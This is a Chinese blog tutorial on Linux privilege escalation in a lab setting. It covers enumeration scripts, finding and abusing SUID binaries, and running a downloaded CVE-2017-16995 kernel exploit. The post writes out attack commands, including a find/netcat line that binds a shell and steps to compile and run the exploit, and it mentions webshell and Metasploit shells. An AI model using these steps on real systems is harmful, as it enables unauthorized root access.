{"title":"权限提升-Linux提权1","uid":"fcd910c24ec5aac777084d6a38361ecb","slug":"权限提升-Linux提权1","date":"2022-06-23T01:10:48.000Z","updated":"2022-06-24T13:07:43.590Z","comments":true,"path":"api/articles/权限提升-Linux提权1.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>脑图：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/Linux%E6%8F%90%E6%9D%83.png\" alt=\"Linux提权\"></p>\n<h2 id=\"0x01-信息收集LinEnum、linuxprivchecker脚本\"><a href=\"#0x01-信息收集LinEnum、linuxprivchecker脚本\" class=\"headerlink\" title=\"0x01 信息收集LinEnum、linuxprivchecker脚本\"></a>0x01 信息收集LinEnum、linuxprivchecker脚本</h2><h3 id=\"0x00-LinEnum\"><a href=\"#0x00-LinEnum\" class=\"headerlink\" title=\"0x00 LinEnum\"></a>0x00 LinEnum</h3><p>需要通过webshell权限或文件上传权限上传“LinEnum.sh”到“tmp”文件夹下。</p>\n<p>（tmp目录是linux临时目录，可读写可执行，若是上传其他目录有可能当前权限不够导致上传失败或者执行不了，linux提权优先上传tmp目录）</p>\n<p>来到“tmp”目录下</p>\n<pre><code>cd /tmp\n</code></pre>\n<p>如果文件不能被执行，给予其一个可执行权限</p>\n<pre><code>chmod +x LinEnum.sh\n\nchmod +x [文件名]\n</code></pre>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624101007086.png\" alt=\"image-20220624101007086\"></p>\n<p>执行文件</p>\n<pre><code>./LinEnum.sh\n\n./[文件名]\n</code></pre>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624101307425.png\" alt=\"image-20220624101307425\"></p>\n<p>通过信息搜集可以查看是否窜在SUID提权的可能，或者可以利用的其他信息。</p>\n<h3 id=\"0x01-linuxprivchecker\"><a href=\"#0x01-linuxprivchecker\" class=\"headerlink\" title=\"0x01 linuxprivchecker\"></a>0x01 linuxprivchecker</h3><p>需要通过webshell权限或文件上传权限上传“linuxprivchecker.py”到“tmp”文件夹下，还需要目标机器上有python环境。</p>\n<p>来到“tmp”目录下，执行文件</p>\n<pre><code>python linuxprivchecker.py\n</code></pre>\n<p>linuxprivchecker会列出目标机器的信息。</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624101608291.png\" alt=\"image-20220624101608291\"></p>\n<p>由于是python脚本，靶机没有安装python环境，导致执行不了。命令执行如图。</p>\n<h2 id=\"0x02-漏洞探针linux-exploit-suggester1-2脚本\"><a href=\"#0x02-漏洞探针linux-exploit-suggester1-2脚本\" class=\"headerlink\" title=\"0x02 漏洞探针linux-exploit-suggester1-2脚本\"></a>0x02 漏洞探针linux-exploit-suggester1-2脚本</h2><h3 id=\"0x00-linux-exploit-suggester\"><a href=\"#0x00-linux-exploit-suggester\" class=\"headerlink\" title=\"0x00 linux-exploit-suggester\"></a>0x00 linux-exploit-suggester</h3><p>需要通过webshell权限或文件上传权限上传“linux-exploit-suggester.sh”到“tmp”文件夹下</p>\n<p>来到“tmp”目录下，执行文件</p>\n<pre><code>./linux-exploit-suggester.sh\n</code></pre>\n<p>linux-exploit-suggester首先会输出内核等信息，然后输出可能存在的漏洞，包括exp的下载地址，可以下载对应的exp来测试。</p>\n<h3 id=\"0x01-linux-exploit-suggester2\"><a href=\"#0x01-linux-exploit-suggester2\" class=\"headerlink\" title=\"0x01 linux-exploit-suggester2\"></a>0x01 linux-exploit-suggester2</h3><p>需要通过webshell权限或文件上传权限上传“linux-exploit-suggester-2.pl”到“tmp”文件夹下，还需要目标机器上有perl环境</p>\n<p>来到“tmp”目录下，执行文件</p>\n<pre><code>perl linux-exploit-suggester-2.pl\n</code></pre>\n<p>linux-exploit-suggester2会直接报告可能的漏洞和exp下载地址。</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624094314803.png\" alt=\"image-20220624094314803\"></p>\n<h2 id=\"0x03-SUID\"><a href=\"#0x03-SUID\" class=\"headerlink\" title=\"0x03 SUID\"></a>0x03 SUID</h2><p>###0x00 介绍</p>\n<p>SUID (Set UID)是Linux中的一种特殊权限,其功能是用户在运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件。</p>\n<pre><code>    在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效. 通俗的来讲,假设我们现在有一个可执行文件ls,其属主为root,当我们通过非root用户登录时,如果ls设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限.，利用此特性,我们可通过SUID进行提权。\n</code></pre>\n<h3 id=\"0x01-设置和取消SUID\"><a href=\"#0x01-设置和取消SUID\" class=\"headerlink\" title=\"0x01 设置和取消SUID\"></a>0x01 设置和取消SUID</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>查看可执行文件是否有suid权限：<br>ls -alh 文件名</p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>设置suid权限：</p>\n<p>chmod u+s 可执行文件</p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>取消suid权限：</p>\n<p>chmod u-s 可执行文件</p></blockquote>\n<h2 id=\"0x04-SUID进行Linux提权\"><a href=\"#0x04-SUID进行Linux提权\" class=\"headerlink\" title=\"0x04  SUID进行Linux提权\"></a>0x04  SUID进行Linux提权</h2><h3 id=\"0x00-1\"><a href=\"#0x00-1\" class=\"headerlink\" title=\"0x00\"></a>0x00</h3><p>利用LinEnum.sh搜集SUID相关信息：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624103714316.png\" alt=\"image-20220624103714316\"></p>\n<p>寻找这几个关键字具有SUID权限的二进制可执行文件提权：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Nmap，Vim，find，Bash，More，Less，Nano，cp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>或者利用手工探针：</p>\n<p>原理：<br>这个命令将从&#x2F;目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到&#x2F;dev&#x2F;null，从而仅列出该用户具有访问权限的那些二进制文件。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null\nfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null （适用Ubuntu）\nfind &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624104448920.png\" alt=\"image-20220624104448920\"></p>\n<p>可以看到没有可利用的文件。</p>\n<h3 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p>将&#x2F;usr&#x2F;bin目录下，将find文件以root赋予suid权限：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624105237895.png\" alt=\"image-20220624105237895\"></p>\n<p>再利用手工探针：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624105342840.png\" alt=\"image-20220624105342840\"></p>\n<p>可以看到有find文件。</p>\n<h3 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p>（没有环境，搭建失败了）</p>\n<p>之后使用冰蝎连接，然后利用MSF连接冰蝎反弹的shell；</p>\n<p>再执行以下命令：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">touch test\n-find test -exec whoami \\; #查看返回的当前权限；（原理：find test文件，并且以find文件的权限执行：whoami命令，如果find是suid,普通用户执行find命令也会获得root权限，再执行whoami就是root）\nfind test -exec netcat -lvp 5555 -e &#x2F;bin&#x2F;sh \\; #nc(netcat) 反弹 shell<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><p>参考文章：<br><a href=\"https://pentestlab.blog/2017/09/25/suid-executables/\">https://pentestlab.blog/2017/09/25/suid-executables/</a></p>\n<h2 id=\"0x05-Linux本地内核漏洞提权\"><a href=\"#0x05-Linux本地内核漏洞提权\" class=\"headerlink\" title=\"0x05 Linux本地内核漏洞提权\"></a>0x05 Linux本地内核漏洞提权</h2><h3 id=\"0x00-2\"><a href=\"#0x00-2\" class=\"headerlink\" title=\"0x00\"></a>0x00</h3><p>靶机：墨者学院 Ubuntu 16.04漏洞复现(CVE-2017-16995)</p>\n<h3 id=\"0x01-1\"><a href=\"#0x01-1\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p>先使用ssh连接靶机：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>ssh -p 端口号 linux服务器用户名@linux服务器ip地址</p></blockquote>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624083730603.png\" alt=\"image-20220624083730603\"></p>\n<p>查看id，普通用户<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624083840869.png\" alt=\"image-20220624083840869\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1、ID&#x3D;0<br>当 UID 是 0 时，代表这个账号是『系统管理员』！当你要创建一个账户为另一个系统管理员账号时， 你可以将该账号的 UID 改成 0 即可；这也就是说，一部系统上面的系统管理员不一定只有 root ！ 但强烈建议避免多个账号的 UID 配置为 0 。</p>\n<p>2、ID&#x3D;1<del>499（系统使用）<br>该范围内的用户id是保留给系统使用的 ID，其实 1</del>65534 之间的账号并没有不同， 也就是除了 0 之外，其它的 UID 并没有不一样，预设 500 以下给系统作为保留账号只是一个习惯。这样的好处是，以有名的 DNS 服务器的启动服务『 named 』为例，这个程序的预设所有人 named 的账号 UID 是 25 ，当你自定义的账号也是 25 时，会造成系统冲突！为了杜绝这样的问题，养成好习惯，保留 500 以前的 UID 给系统使用！</p>\n<p>注： 一般来说， 1到99 会保留给系统预设的账号，另外 100~499 则保留给一些服务来使用。</p>\n<p>3、ID&#x3D;500~65535 给一般使用者用的。</p></blockquote>\n<h3 id=\"0x02-1\"><a href=\"#0x02-1\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p>上传漏洞探针脚本进行检测：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624094201185.png\" alt=\"image-20220624094201185\"></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624094314803.png\" alt=\"image-20220624094314803\"></p>\n<p>可以看到探测出三个可利用漏洞；CVE-2017-16995也存在。</p>\n<h3 id=\"0x03-1\"><a href=\"#0x03-1\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><p>下载CVE-2017-16995EXP：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624094633461.png\" alt=\"image-20220624094633461\"></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624094653824.png\" alt=\"image-20220624094653824\"></p>\n<p>将45010.c文件上传至靶机：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624094814591.png\" alt=\"image-20220624094814591\"></p>\n<h3 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h3><p>由于c文件，需要编译运行：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624095010262.png\" alt=\"image-20220624095010262\"></p>\n<p>执行文件发现权限不够，修改权限：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>chomd +x 45010.c</p></blockquote>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624095135941.png\" alt=\"image-20220624095135941\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>使用以下命令先编译：<br>gcc 45010.c -o 45010</p>\n<p>再执行：</p>\n<p>.&#x2F;45010</p></blockquote>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624095517115.png\" alt=\"image-20220624095517115\"></p>\n<h3 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h3><p>查看当前权限：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624095554777.png\" alt=\"image-20220624095554777\"></p>\n<p>可以看到成功提权。</p>\n<h3 id=\"0x06\"><a href=\"#0x06\" class=\"headerlink\" 